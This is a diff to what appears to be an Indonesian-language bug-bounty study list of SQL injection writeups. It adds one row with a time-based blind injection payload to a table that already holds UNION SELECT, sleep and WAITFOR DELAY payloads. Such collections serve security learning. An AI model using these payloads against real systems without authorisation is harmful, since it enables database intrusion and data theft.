@@ -73,6 +73,7 @@ http://192.168.2.3/news-and-events.php?id=-22 union select 1,group_concat(table_
 |[How I found a critical P1 bug in 5 minutes using a cellphone — Bug Bounty](https://medium.com/@mrempy/how-i-found-a-critical-p1-bug-in-5-minutes-using-a-cellphone-bug-bounty-303ebec3edd6)|injeksi pada login form<br>`admin’ and (select * from(select(sleep(40)))SQLI) and ‘abc’ = ‘abc`<br>menggunakan kiwi browser untuk menangkap request|
 |[120 Days of High Frequency Hunting](https://kuldeep.io/posts/120-days-of-high-frequency-hunting/)|time delay vuln<br>`'; WAITFOR DELAY '00:00:10'-- -`|
 |[Making a Blind SQL Injection a Little Less Blind](https://medium.com/@tomnomnom/making-a-blind-sql-injection-a-little-less-blind-428dcb614ba8)|sqli pada json, jika inject ' -> error, coba netralisir dengan /*'*/|
+|[bypass sql injection #1109311](https://hackerone.com/reports/1224660)|`0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z`|
 
 ## Resource
 - [Web Security Academy - SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
